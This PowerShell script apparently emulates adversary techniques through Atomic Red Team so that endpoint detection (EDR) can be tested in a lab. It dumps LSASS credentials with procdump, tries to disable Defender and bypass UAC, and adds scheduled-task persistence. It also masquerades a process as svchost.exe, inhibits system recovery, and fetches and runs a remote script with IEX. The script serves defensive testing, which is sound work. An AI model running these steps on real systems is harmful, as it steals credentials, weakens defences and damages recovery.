<#
v1.8.1
.SYNOPSIS
    A modular script to emulate adversary tactics for EDR testing.

.DESCRIPTION
    This script executes a series of MITRE ATT&CK techniques in a logical sequence.
    Each tactic is contained within its own function, and all actions are logged.
    
    The script automatically cleans up artifacts from previous runs before starting,
    and cleans up before each individual test to prevent "already exists" errors.

.NOTES
    - The script performs automatic cleanup before starting and before each test
    - If the script is interrupted, run the cleanup commands displayed at the end
    - You can safely re-run the script multiple times
    - All execution details are logged to Atomic-Execution-Log.csv
    - v1.7: Changed to install Invoke-AtomicRedTeam from GitHub instead of PowerShell Gallery
    - v1.8: Major hardening - added robust error handling, test verification, network retry logic,
            Windows version detection, PowerShell version check, and improved reliability

.WARNING
    ********************************************************************************
    *** FOR AUTHORIZED LAB USE ONLY - REVIEW EACH COMMAND BEFORE RUNNING       ***
    *** ***
    *** This script makes significant changes to a system to mimic malicious   ***
    *** behavior. Run this ONLY on a dedicated, isolated lab machine that you   ***
    *** have explicit permission to test. DO NOT run on a production system.    ***
    ********************************************************************************
#>

# --- Script Configuration & Logging ---
# Defensive: Handle cases where $PSScriptRoot is empty
if ([string]::IsNullOrEmpty($PSScriptRoot)) {
    $ScriptRoot = $PWD.Path
    Write-Warning "PSScriptRoot is empty, using current directory: $ScriptRoot"
} else {
    $ScriptRoot = $PSScriptRoot
}

$LogFile = Join-Path $ScriptRoot "Attack-Simulation-Log.txt"
$ExecutionLogFile = Join-Path $ScriptRoot "Atomic-Execution-Log.csv"

# Don't suppress all errors globally - handle them explicitly where needed
$ErrorActionPreference = "Stop"

function Write-Log {
    param(
        [Parameter(Mandatory=$true)][string]$Message,
        [Parameter()][ValidateSet("INFO", "WARN", "ERROR", "SUCCESS")][string]$Level = "INFO",
        [Parameter()][switch]$NoConsole
    )
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogMessage = "[$Timestamp] [$Level] $Message"
    
    try {
        $LogMessage | Out-File -FilePath $LogFile -Append -ErrorAction SilentlyContinue
    } catch {
        Write-Warning "Failed to write to log file: $($_.Exception.Message)"
    }
    
    if (-not $NoConsole) {
        $Color = @{ INFO = "White"; WARN = "Yellow"; ERROR = "Red"; SUCCESS = "Green" }
        if ($Color.ContainsKey($Level)) {
            Write-Host $LogMessage -ForegroundColor $Color[$Level]
        } else {
            Write-Host $LogMessage
        }
    }
}

# --- Helper Functions ---
function Test-NetworkConnectivity {
    param([string]$TestUrl = "https://raw.githubusercontent.com")
    
    Write-Log "Testing network connectivity to $TestUrl..."
    try {
        $response = Invoke-WebRequest -Uri $TestUrl -Method Head -TimeoutSec 10 -UseBasicParsing -ErrorAction Stop
        Write-Log -Level SUCCESS "Network connectivity confirmed."
        return $true
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level ERROR "Network connectivity test failed: $errorMsg"
        return $false
    }
}

function Get-WindowsVersion {
    try {
        $os = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction Stop
        $version = $os.Caption
        $build = $os.BuildNumber
        
        if ($build -ge 22000) {
            return "Windows 11 (Build $build)"
        } elseif ($build -ge 10240) {
            return "Windows 10 (Build $build)"
        } else {
            return "Windows (Build $build)"
        }
    } catch {
        return "Unknown Windows Version"
    }
}

function Test-AvailableDiskSpace {
    param([int]$RequiredMB = 200)
    
    try {
        $drive = (Get-Item $ScriptRoot).PSDrive.Name
        $disk = Get-PSDrive -Name $drive -ErrorAction Stop
        $availableMB = [math]::Round($disk.Free / 1MB, 2)
        
        Write-Log "Available disk space on ${drive}: ${availableMB}MB"
        
        if ($availableMB -lt $RequiredMB) {
            Write-Log -Level WARN "Low disk space: ${availableMB}MB available, ${RequiredMB}MB recommended."
            return $false
        }
        return $true
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level WARN "Could not verify disk space: $errorMsg"
        return $true  # Continue anyway
    }
}



function Invoke-WithRetry {
    param(
        [Parameter(Mandatory=$true)][ScriptBlock]$ScriptBlock,
        [Parameter()][int]$MaxRetries = 3,
        [Parameter()][int]$DelaySeconds = 5,
        [Parameter()][string]$OperationName = "Operation"
    )
    
    $attempt = 1
    while ($attempt -le $MaxRetries) {
        try {
            Write-Log "Attempting $OperationName (attempt $attempt of $MaxRetries)..."
            $result = & $ScriptBlock
            Write-Log -Level SUCCESS "$OperationName succeeded."
            return $result
        } catch {
            $errorMsg = $_.Exception.Message
            Write-Log -Level WARN "$OperationName failed on attempt $attempt : $errorMsg"
            if ($attempt -lt $MaxRetries) {
                Write-Log "Waiting $DelaySeconds seconds before retry..."
                Start-Sleep -Seconds $DelaySeconds
            }
            $attempt++
        }
    }
    
    Write-Log -Level ERROR "$OperationName failed after $MaxRetries attempts."
    throw "Failed after $MaxRetries retry attempts"
}

# --- Prerequisite Checks ---
function Check-Prerequisites {
    Write-Log "=== Running prerequisite checks ==="
    
    # 0. Detect and log Windows version
    $windowsVersion = Get-WindowsVersion
    Write-Log "Detected OS: $windowsVersion"
    
    # 1. Check PowerShell Version
    $psVersion = $PSVersionTable.PSVersion
    Write-Log "PowerShell Version: $($psVersion.ToString())"
    
    if ($psVersion.Major -lt 5) {
        Write-Log -Level ERROR "PowerShell 5.0 or higher is required. Current version: $($psVersion.ToString())"
        throw "Insufficient PowerShell version"
    }
    Write-Log -Level SUCCESS "PowerShell version check passed."
    
    # 2. Check Execution Policy
    $executionPolicy = Get-ExecutionPolicy
    Write-Log "Current Execution Policy: $executionPolicy"
    
    if ($executionPolicy -eq "Restricted" -or $executionPolicy -eq "AllSigned") {
        Write-Log -Level WARN "Execution policy is restrictive: $executionPolicy"
        Write-Log -Level WARN "You may need to run: Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
    }
    
    # 3. Force PowerShell to use TLS 1.2 for secure downloads
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Write-Log -Level SUCCESS "Set security protocol to TLS 1.2 for this session."
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level WARN "Could not set TLS 1.2: $errorMsg"
    }

    # 4. Ensure script is running as Administrator
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-NOT $isAdmin) {
        Write-Log -Level ERROR "This script must be run with Administrator privileges. Terminating."
        throw "Administrator privileges required."
    }
    Write-Log -Level SUCCESS "Administrator privileges confirmed."
    
    # 5. Test network connectivity
    if (-not (Test-NetworkConnectivity)) {
        Write-Log -Level WARN "Network connectivity issues detected. Downloads may fail."
        $continue = Read-Host "Continue anyway? (Y/N)"
        if ($continue -ne "Y") {
            throw "Network connectivity required"
        }
    }
    
    # 6. Check available disk space
    Test-AvailableDiskSpace -RequiredMB 200 | Out-Null

    # 7. Check for and install Invoke-AtomicRedTeam module (GITHUB APPROACH)
    Write-Log "Checking for Invoke-AtomicRedTeam module..."
    
    $atomicPath = "C:\AtomicRedTeam\invoke-atomicredteam"
    $modulePsdPath = "$atomicPath\Invoke-AtomicRedTeam.psd1"
    
    if (-NOT (Test-Path $modulePsdPath)) {
        Write-Log -Level WARN "Module 'Invoke-AtomicRedTeam' not found. Installing from GitHub..."
        
        try {
            # Download and execute installation script, then immediately call Install-AtomicRedTeam
            # CRITICAL: Must be in one line so Install-AtomicRedTeam function is available
            Write-Log "Downloading installation script from GitHub..."
            IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -GetAtomics -Force
            
            # Verify installation succeeded
            if (-NOT (Test-Path $modulePsdPath)) {
                throw "Module installation completed but module file not found at: $modulePsdPath"
            }
            
            Write-Log -Level SUCCESS "Successfully installed Invoke-AtomicRedTeam from GitHub."
        } catch {
            $errorMsg = $_.Exception.Message
            Write-Log -Level ERROR "Failed to install from GitHub: $errorMsg"
            Write-Log -Level ERROR "Please manually run: IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -GetAtomics"
            throw "GitHub installation failed"
        }
    } else {
        Write-Log "Module 'Invoke-AtomicRedTeam' found at $atomicPath."
    }
    
    # 8. Import the module from the installed location
    Write-Log "Importing Invoke-AtomicRedTeam module..."
    try {
        Import-Module $modulePsdPath -Force -Global -ErrorAction Stop
        Write-Log -Level SUCCESS "Successfully imported Invoke-AtomicRedTeam module."
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level ERROR "Failed to import module: $errorMsg"
        throw "Module import failed"
    }
    
    # 9. Verify the module commands are available
    Write-Log "Verifying module commands..."
    
    # Check for the main command that we'll actually use
    $command = Get-Command Invoke-AtomicTest -ErrorAction SilentlyContinue
    if (-NOT $command) {
        Write-Log -Level ERROR "Failed to load 'Invoke-AtomicRedTeam' module commands."
        Write-Log "Available commands in module:"
        Get-Command -Module Invoke-AtomicRedTeam | ForEach-Object { Write-Log "  - $($_.Name)" }
        throw "Module commands not available after import."
    }
    Write-Log -Level SUCCESS "'Invoke-AtomicRedTeam' module loaded successfully."
    Write-Log "Primary command 'Invoke-AtomicTest' is available."

    # 10. Check for and download the Atomics Test Library
    if (-NOT (Test-Path "C:\AtomicRedTeam\atomics")) {
        Write-Log -Level WARN "Atomic Red Team test library not found. Downloading..."
        try {
            # Need to re-run installation script to get Install-AtomicRedTeam function
            Write-Log "Downloading installation script to access Install-AtomicRedTeam function..."
            IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -GetAtomics -Force
            
            # Verify download succeeded
            if (-NOT (Test-Path "C:\AtomicRedTeam\atomics")) {
                throw "Atomics library download reported success but directory not found"
            }
            
            Write-Log -Level SUCCESS "Successfully downloaded the Atomics library."
        } catch {
            $errorMsg = $_.Exception.Message
            Write-Log -Level ERROR "Failed to download the Atomics library: $errorMsg"
            Write-Log -Level ERROR "Please manually run: IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -GetAtomics"
            throw "Atomics download failed"
        }
    } else {
        Write-Log -Level SUCCESS "Atomics library is already present at C:\AtomicRedTeam\atomics"
    }

    Write-Log -Level SUCCESS "=== All prerequisites are met ==="
    return $true
}

# Helper function to run atomic tests with detailed output and validation
function Invoke-SafeAtomicTest {
    param(
        [Parameter(Mandatory=$true)][string]$TechniqueId,
        [Parameter()][int[]]$TestNumbers,
        [Parameter()][switch]$CheckOnly
    )
    
    Write-Log "Checking available tests for $TechniqueId..."
    
    try {
        Invoke-AtomicTest $TechniqueId -ShowDetailsBrief -ErrorAction SilentlyContinue
        
        if ($CheckOnly) { return }
        
        if ($TestNumbers) {
            foreach ($testNum in $TestNumbers) {
                Write-Log "Processing $TechniqueId test #$testNum..."
                
                # CLEANUP FIRST to ensure clean slate
                Write-Log "Running cleanup to ensure clean environment..."
                try {
                    Invoke-AtomicTest $TechniqueId -TestNumbers $testNum -Cleanup -ErrorAction SilentlyContinue
                    Start-Sleep -Seconds 2  # Wait for cleanup to complete
                } catch {
                    Write-Log "Cleanup completed (no artifacts to clean)."
                }
                
                # Check prerequisites
                Write-Log "Checking prerequisites for $TechniqueId test #$testNum..."
                try {
                    $prereqCheck = Invoke-AtomicTest $TechniqueId -TestNumbers $testNum -CheckPrereqs -ErrorAction SilentlyContinue 2>&1
                    Write-Host $prereqCheck
                    
                    if ($prereqCheck -match "Prerequisites not met") {
                        Write-Log -Level WARN "Prerequisites not met. Attempting to get prerequisites..."
                        Invoke-AtomicTest $TechniqueId -TestNumbers $testNum -GetPrereqs -ErrorAction Stop
                        Start-Sleep -Seconds 2
                    }
                } catch {
                    $errorMsg = $_.Exception.Message
                    Write-Log -Level WARN "Prerequisite check/installation failed: $errorMsg"
                }
                
                # Execute the test
                Write-Log "Executing $TechniqueId test #$testNum..."
                try {
                    Invoke-AtomicTest $TechniqueId -TestNumbers $testNum -TimeoutSeconds 180 -ExecutionLogPath $ExecutionLogFile -Confirm:$false -ErrorAction Stop
                    Write-Log -Level SUCCESS "Test #$testNum completed successfully."
                } catch {
                    $errorMsg = $_.Exception.Message
                    Write-Log -Level ERROR "Test #$testNum failed: $errorMsg"
                    Write-Log "This may be expected behavior if security controls blocked the test."
                }
                
                Start-Sleep -Seconds 1  # Brief pause between tests
            }
        } else {
            # Run all tests for the technique
            Write-Log "Running cleanup to ensure clean environment..."
            try {
                Invoke-AtomicTest $TechniqueId -Cleanup -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 2
            } catch {
                Write-Log "Cleanup completed (no artifacts to clean)."
            }
            
            Write-Log "Checking prerequisites for $TechniqueId..."
            try {
                Invoke-AtomicTest $TechniqueId -CheckPrereqs -ErrorAction SilentlyContinue
            } catch {
                $errorMsg = $_.Exception.Message
                Write-Log -Level WARN "Prerequisite check failed: $errorMsg"
            }
            
            Write-Log "Executing $TechniqueId (all available tests)..."
            try {
                Invoke-AtomicTest $TechniqueId -TimeoutSeconds 180 -ExecutionLogPath $ExecutionLogFile -Confirm:$false -ErrorAction Stop
                Write-Log -Level SUCCESS "$TechniqueId completed successfully."
            } catch {
                $errorMsg = $_.Exception.Message
                Write-Log -Level ERROR "$TechniqueId failed: $errorMsg"
            }
        }
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level ERROR "Fatal error in Invoke-SafeAtomicTest for $TechniqueId : $errorMsg"
    }
}

# --- Tactic 1: Execution ---
function Invoke-ExecutionTactic {
    Write-Log "`n=== Starting Tactic: EXECUTION ==="
    Write-Log "Executing T1059.005: CScript launching cmd.exe for recon..."
    $vbsPath = Join-Path $ScriptRoot "temp-recon.vbs"
    $vbsCode = 'Set objShell = CreateObject("WScript.Shell"): objShell.Run "cmd /c whoami & hostname", 0, True'
    try {
        Set-Content -Path $vbsPath -Value $vbsCode -ErrorAction Stop
        $result = cscript.exe $vbsPath //Nologo 2>&1
        Write-Log -Level SUCCESS "Successfully executed VBScript for recon."
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level ERROR "Execution Tactic Failed: T1059.005 - $errorMsg"
    } finally {
        if (Test-Path $vbsPath) { 
            Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue
        }
    }
}

# --- Tactic 2: Persistence ---
function Invoke-PersistenceTactic {
    Write-Log "`n=== Starting Tactic: PERSISTENCE ==="
    Write-Log "Executing T1053.005: Scheduled Task..."
    try {
        Invoke-SafeAtomicTest -TechniqueId "T1053.005" -TestNumbers 2
        Write-Log -Level SUCCESS "Persistence tactic completed."
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level ERROR "Persistence Tactic Failed: T1053.005 - $errorMsg"
    }
}

# --- Tactic 3: Privilege Escalation ---
function Invoke-PrivilegeEscalationTactic {
    Write-Log "`n=== Starting Tactic: PRIVILEGE ESCALATION ==="
    Write-Log "Executing T1548.002: Bypass User Account Control..."
    
    $windowsVersion = Get-WindowsVersion
    if ($windowsVersion -like "*Windows 11*") {
        Write-Log -Level WARN "Running on Windows 11 - UAC bypass techniques may be patched."
    }
    
    try {
        Invoke-SafeAtomicTest -TechniqueId "T1548.002" -TestNumbers 3
        Write-Log -Level SUCCESS "Privilege escalation tactic completed."
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level ERROR "Privilege Escalation Tactic Failed: T1548.002 - $errorMsg"
    }
}

# --- Tactic 4: Defense Evasion ---
function Invoke-DefenseEvasionTactic {
    Write-Log "`n=== Starting Tactic: DEFENSE EVASION ==="
    
    # T1562.001: Disable or Modify Tools
    Write-Log "Executing T1562.001: Disable Microsoft Defender..."
    
    $windowsVersion = Get-WindowsVersion
    if ($windowsVersion -like "*Windows 11*") {
        Write-Log -Level WARN "Running on Windows 11 - Tamper Protection is likely enabled and will block this test."
    }
    
    try {
        Invoke-SafeAtomicTest -TechniqueId "T1562.001" -TestNumbers 17
        Write-Log -Level SUCCESS "T1562.001 execution attempted."
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level ERROR "Defense Evasion Tactic Failed: T1562.001 - $errorMsg"
    }
    Start-Sleep -Seconds 2
    
    # T1027: Obfuscated Files or Information
    Write-Log "Executing T1027: PowerShell with encoded command..."
    try {
        $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Write-Host '[SUCCESS] Encoded command executed.'"))
        $result = powershell.exe -EncodedCommand $encodedCommand 2>&1
        Write-Log -Level SUCCESS "Successfully executed encoded PowerShell command."
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level ERROR "Defense Evasion Tactic Failed: T1027 - $errorMsg"
    }
    Start-Sleep -Seconds 2
    
    # T1105: Ingress Tool Transfer
    Write-Log "Executing T1105: Ingress Tool Transfer..."
    try {
        Invoke-SafeAtomicTest -TechniqueId "T1105" -TestNumbers 7
        Write-Log -Level SUCCESS "T1105 execution completed."
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level ERROR "Defense Evasion Tactic Failed: T1105 - $errorMsg"
    }
    Start-Sleep -Seconds 2
    
    # T1036.003: Masquerading
    Write-Log "Executing T1036.003: Masquerading..."
    $masqueradePath = Join-Path $env:TEMP "svchost.exe"
    try {
        $pshellPath = Join-Path $PSHOME "powershell.exe"
        if (Test-Path $pshellPath) {
            Copy-Item -Path $pshellPath -Destination $masqueradePath -Force -ErrorAction Stop
            Start-Process -FilePath $masqueradePath -ArgumentList "-Command Write-Host '[SUCCESS] Masqueraded process executed.'" -Wait -NoNewWindow -ErrorAction Stop
            Write-Log -Level SUCCESS "Successfully executed masqueraded process."
        } else {
            Write-Log -Level ERROR "PowerShell executable not found at: $pshellPath"
        }
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level ERROR "Defense Evasion Tactic Failed: T1036.003 - $errorMsg"
    } finally {
        if (Test-Path $masqueradePath) {
            Remove-Item $masqueradePath -Force -ErrorAction SilentlyContinue
        }
    }
}

# --- Tactic 5: Credential Access ---
function Invoke-CredentialAccessTactic {
    Write-Log "`n=== Starting Tactic: CREDENTIAL ACCESS ==="
    Write-Log "Executing T1003.001: Dumping LSASS memory with procdump..."
    
    $windowsVersion = Get-WindowsVersion
    if ($windowsVersion -like "*Windows 11*") {
        Write-Log -Level WARN "Running on Windows 11 - Credential Guard may be enabled and will block LSASS access."
    }
    
    $sysinternalsZip = Join-Path $env:TEMP "SysinternalsSuite.zip"
    $sysinternalsDir = Join-Path $env:TEMP "SysinternalsSuite"
    $procdumpPath = Join-Path $sysinternalsDir "procdump64.exe"
    $lsassDumpFile = Join-Path $ScriptRoot "lsass.dmp"
    
    try {
        if (-not (Test-Path $procdumpPath)) {
            Write-Log "Downloading Sysinternals Suite..."
            (New-Object System.Net.WebClient).DownloadFile("https://download.sysinternals.com/files/SysinternalsSuite.zip", $sysinternalsZip)
            
            Write-Log "Extracting Sysinternals Suite..."
            Expand-Archive -Path $sysinternalsZip -DestinationPath $sysinternalsDir -Force -ErrorAction Stop
        }
        
        if (-not (Test-Path $procdumpPath)) { 
            throw "procdump64.exe not found after extraction at: $procdumpPath" 
        }
        
        Write-Log "Attempting LSASS dump (may be blocked by security controls)..."
        $dumpResult = & $procdumpPath -accepteula -ma lsass.exe $lsassDumpFile 2>&1
        
        Start-Sleep -Seconds 2  # Give time for file to be written
        
        if (Test-Path $lsassDumpFile) {
            Write-Log -Level SUCCESS "Successfully dumped LSASS memory to $lsassDumpFile."
            Write-Log -Level WARN "NOTE: If this succeeded, your EDR may need tuning!"
        } else {
            Write-Log -Level WARN "LSASS dump was blocked (Access Denied) - This is EXPECTED and GOOD!"
            Write-Log -Level SUCCESS "EDR/Security controls are working as intended."
            Write-Log "The attempt should have generated security alerts for your testing."
        }
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level WARN "Credential Access attempt blocked: $errorMsg"
        Write-Log -Level SUCCESS "This is expected behavior - EDR should block LSASS access."
    }
}

# --- Tactic 6: Discovery ---
function Invoke-DiscoveryTactic {
    Write-Log "`n=== Starting Tactic: DISCOVERY ==="
    Write-Log "Executing common on-host reconnaissance commands..."
    try {
        Invoke-SafeAtomicTest -TechniqueId "T1082" -TestNumbers 1
        Invoke-SafeAtomicTest -TechniqueId "T1057" -TestNumbers 2
        Invoke-SafeAtomicTest -TechniqueId "T1049" -TestNumbers 1
        Write-Log -Level SUCCESS "Successfully executed basic on-host discovery."
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level ERROR "Discovery Tactic Failed: Basic Recon - $errorMsg"
    }
    Start-Sleep -Seconds 2
    
    Write-Log "Executing T1018: Remote System Discovery..."
    $reconFile = Join-Path $ScriptRoot "network_recon.txt"
    try {
        $arpResult = arp -a 2>&1
        $arpResult | Out-File -FilePath $reconFile -ErrorAction Stop
        if (Test-Path $reconFile) {
            Write-Log -Level SUCCESS "Successfully performed network scan and saved results."
        }
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level ERROR "Discovery Tactic Failed: T1018 - $errorMsg"
    }
}

# --- Tactic 7: Command and Control (C2) ---
function Invoke-CommandAndControlTactic {
    Write-Log "`n=== Starting Tactic: COMMAND AND CONTROL ==="
    Write-Log "Executing T1105: Ingress Tool Transfer via PowerShell..."
    $downloadFile = Join-Path $env:TEMP "c2_payload.txt"
    try {
        # Using a reliable test file from Microsoft
        Invoke-WebRequest -Uri 'https://www.bing.com/robots.txt' -OutFile $downloadFile -TimeoutSec 30 -ErrorAction Stop
        
        if (Test-Path $downloadFile) {
            Write-Log -Level SUCCESS "Successfully executed download command."
        }
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level WARN "C2 download test failed (expected if network restricted): $errorMsg"
    }
    Start-Sleep -Seconds 2
    
    Write-Log "Executing T1197: BITS Job..."
    try {
        Invoke-SafeAtomicTest -TechniqueId "T1197" -TestNumbers 2
        Write-Log -Level SUCCESS "BITS job test completed."
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level ERROR "C2 Tactic Failed: T1197 - $errorMsg"
    }
}

# --- Tactic 8: Impact ---
function Invoke-ImpactTactic {
    Write-Log "`n=== Starting Tactic: IMPACT ==="
    Write-Log "Executing T1490: Inhibit System Recovery..."
    try {
        Invoke-SafeAtomicTest -TechniqueId "T1490" -TestNumbers 9
        Write-Log -Level SUCCESS "Impact tactic completed."
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Log -Level ERROR "Impact Tactic Failed: T1490 - $errorMsg"
    }
}

# --- Main Script Body ---
$CleanupCommands = [System.Collections.ArrayList]@()

Write-Host "`n" + ("="*80)
Write-Host "ATOMIC RED TEAM ATTACK SIMULATION v1.8 - HARDENED EDITION" -ForegroundColor Cyan
Write-Host ("="*80) + "`n"

try {
    if (Check-Prerequisites) {
        Write-Log "`n=== Starting emulation chain ==="
        Write-Log "Detailed execution logs will be saved to: $ExecutionLogFile"
        
        # Clean up any artifacts from previous runs first
        Write-Log "Performing initial cleanup of any previous test artifacts..."
        try {
            schtasks /delete /tn "spawn" /f 2>&1 | Out-Null
            Remove-Item (Join-Path $env:TEMP "svchost.exe") -Force -ErrorAction SilentlyContinue
            Remove-Item (Join-Path $env:TEMP "c2_payload.txt") -Force -ErrorAction SilentlyContinue
            Remove-Item (Join-Path $ScriptRoot "lsass.dmp") -Force -ErrorAction SilentlyContinue
            Remove-Item (Join-Path $ScriptRoot "network_recon.txt") -Force -ErrorAction SilentlyContinue
            Remove-Item (Join-Path $ScriptRoot "temp-recon.vbs") -Force -ErrorAction SilentlyContinue
            Write-Log -Level SUCCESS "Initial cleanup completed."
        } catch {
            Write-Log "Initial cleanup completed (some items may not have existed)."
        }
        
        # Execute tactics with error handling for each
        try { Invoke-ExecutionTactic } catch { $errorMsg = $_.Exception.Message; Write-Log -Level ERROR "Execution tactic failed: $errorMsg" }
        $CleanupCommands.Add("Remove-Item (Join-Path '$ScriptRoot' 'temp-recon.vbs') -Force -ErrorAction SilentlyContinue") | Out-Null
        
        try { Invoke-PersistenceTactic } catch { $errorMsg = $_.Exception.Message; Write-Log -Level ERROR "Persistence tactic failed: $errorMsg" }
        $CleanupCommands.Add("Invoke-AtomicTest T1053.005 -TestNumbers 2 -Cleanup") | Out-Null
        
        try { Invoke-PrivilegeEscalationTactic } catch { $errorMsg = $_.Exception.Message; Write-Log -Level ERROR "Privilege Escalation tactic failed: $errorMsg" }
        $CleanupCommands.Add("Invoke-AtomicTest T1548.002 -TestNumbers 3 -Cleanup") | Out-Null
        
        try { Invoke-DefenseEvasionTactic } catch { $errorMsg = $_.Exception.Message; Write-Log -Level ERROR "Defense Evasion tactic failed: $errorMsg" }
        $CleanupCommands.Add("Invoke-AtomicTest T1562.001 -TestNumbers 17 -Cleanup") | Out-Null
        $CleanupCommands.Add("Invoke-AtomicTest T1105 -TestNumbers 7 -Cleanup") | Out-Null
        $CleanupCommands.Add("Remove-Item (Join-Path '$env:TEMP' 'svchost.exe') -Force -ErrorAction SilentlyContinue") | Out-Null
        
        try { Invoke-CredentialAccessTactic } catch { $errorMsg = $_.Exception.Message; Write-Log -Level ERROR "Credential Access tactic failed: $errorMsg" }
        $CleanupCommands.Add("Remove-Item (Join-Path '$env:TEMP' 'SysinternalsSuite.zip') -Force -ErrorAction SilentlyContinue") | Out-Null
        $CleanupCommands.Add("Remove-Item (Join-Path '$env:TEMP' 'SysinternalsSuite') -Recurse -Force -ErrorAction SilentlyContinue") | Out-Null
        $CleanupCommands.Add("Remove-Item (Join-Path '$ScriptRoot' 'lsass.dmp') -Force -ErrorAction SilentlyContinue") | Out-Null
        
        try { Invoke-DiscoveryTactic } catch { $errorMsg = $_.Exception.Message; Write-Log -Level ERROR "Discovery tactic failed: $errorMsg" }
        $CleanupCommands.Add("Remove-Item (Join-Path '$ScriptRoot' 'network_recon.txt') -Force -ErrorAction SilentlyContinue") | Out-Null
        
        try { Invoke-CommandAndControlTactic } catch { $errorMsg = $_.Exception.Message; Write-Log -Level ERROR "Command and Control tactic failed: $errorMsg" }
        $CleanupCommands.Add("Remove-Item (Join-Path '$env:TEMP' 'c2_payload.txt') -Force -ErrorAction SilentlyContinue") | Out-Null
        $CleanupCommands.Add("Invoke-AtomicTest T1197 -TestNumbers 2 -Cleanup") | Out-Null
        
        try { Invoke-ImpactTactic } catch { $errorMsg = $_.Exception.Message; Write-Log -Level ERROR "Impact tactic failed: $errorMsg" }
        $CleanupCommands.Add("Invoke-AtomicTest T1490 -TestNumbers 9 -Cleanup") | Out-Null

        Write-Log "`n=== Emulation chain completed ==="
        Write-Log -Level SUCCESS "Review the execution log at: $ExecutionLogFile"
        Write-Log -Level SUCCESS "Review the detailed log at: $LogFile"
    }
} catch {
    $errorMsg = $_.Exception.Message
    $stackTrace = $_.ScriptStackTrace
    Write-Log -Level ERROR "A fatal error occurred during emulation: $errorMsg"
    Write-Log -Level ERROR "Stack Trace: $stackTrace"
    Write-Log "Script terminated. Attempting cleanup..."
} finally {
    Write-Host "`n" + ("="*80)
    Write-Log "Script execution finished."
    
    if ($CleanupCommands.Count -gt 0) {
        Write-Host "`n" + ("-"*80)
        Write-Log -Level WARN "POST-SCRIPT CLEANUP COMMANDS:"
        Write-Host "NOTE: The script auto-cleans before each test, but you can manually run" -ForegroundColor Cyan
        Write-Host "      these commands to ensure all artifacts are removed:" -ForegroundColor Cyan
        Write-Host ""
        foreach ($command in $CleanupCommands) { 
            Write-Host "  $command" -ForegroundColor Yellow 
        }
        Write-Host ("-"*80) + "`n"
    }
    
    Write-Host ("="*80)
    Write-Host "For more information, review: $LogFile" -ForegroundColor Cyan
    Write-Host ("="*80) + "`n"
}
